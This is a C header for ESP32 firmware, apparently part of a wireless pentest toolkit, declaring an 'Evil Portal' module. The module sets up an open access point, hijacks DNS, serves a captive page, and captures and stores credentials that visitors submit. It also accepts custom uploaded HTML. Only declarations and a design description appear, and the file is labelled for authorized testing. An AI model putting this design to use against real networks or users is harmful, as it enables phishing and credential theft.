/*
 * SPDX-FileCopyrightText: 2026 Black Crow Official Community Dxt and contributors
 *
 * SPDX-License-Identifier: GPL-3.0-or-later
 */

#pragma once

#include <stdint.h>
#include <stdbool.h>
#include "esp_err.h"

/* ============================================================
 * Evil Portal — WiFi captive portal (authorized testing only)
 * ------------------------------------------------------------
 * Brings up an OPEN SoftAP, hijacks DNS so every lookup resolves to the
 * device (192.168.4.1), and serves a captive-portal page to connected
 * clients via esp_http_server. Form submissions are captured and streamed to
 * the operator app over the BLE line protocol (and kept in a small in-RAM
 * ring so `portal creds` can re-dump them after a reconnect).
 *
 * Radio-exclusive with every other WiFi feature (attack/monitor/spectrum/
 * live-scan/spam): starting the portal stops them, and starting any of them
 * stops the portal. BLE (the app link) coexists via SW coexistence.
 *
 * Built-in templates are GENERIC and do NOT impersonate any real brand. An
 * operator-supplied custom-HTML path is a later phase.
 * ============================================================ */

#define EVIL_PORTAL_SSID_MAX   32
#define EVIL_PORTAL_TMPL_MAX   16   /* template id length */

esp_err_t evil_portal_init(void);

/* Start the portal. `template_id` selects a built-in template; `ssid` is the
 * open AP name (NULL/empty -> the template's default); `channel` 1..13
 * (0 -> 1). Stops any conflicting WiFi feature first. */
esp_err_t evil_portal_start(const char *template_id, const char *ssid,
                            uint8_t channel);

/* Tear down HTTP + DNS + SoftAP and restore the STA baseline. Safe when
 * not running. */
esp_err_t evil_portal_stop(void);

bool evil_portal_is_running(void);

/* Emit a `portal: STATUS ...` line (and START context when running). */
void evil_portal_status(void);

/* Emit the built-in template catalog as `portal: TMPL ...` lines. */
void evil_portal_list_templates(void);

/* Re-emit captured credentials as `portal: CRED ...` lines. Reads the
 * persistent LittleFS log when available, else the in-RAM ring. */
void evil_portal_dump_creds(void);

/* Clear captured credentials (RAM ring + persistent log). */
void evil_portal_clear_creds(void);

/* ---- Operator-supplied custom HTML (stored on LittleFS) ----
 * Uploaded in chunks so each CLI line stays within the BLE/line limit:
 *   begin(name) -> open the file, data(hex) -> append decoded bytes
 *   (repeatable), end() -> finalize. `name` is sanitized to [A-Za-z0-9_].
 * A finalized template can then be started with `portal start <name>`. */
esp_err_t evil_portal_html_begin(const char *name);
esp_err_t evil_portal_html_data(const char *hex);
esp_err_t evil_portal_html_end(void);
void      evil_portal_html_list(void);
esp_err_t evil_portal_html_remove(const char *name);
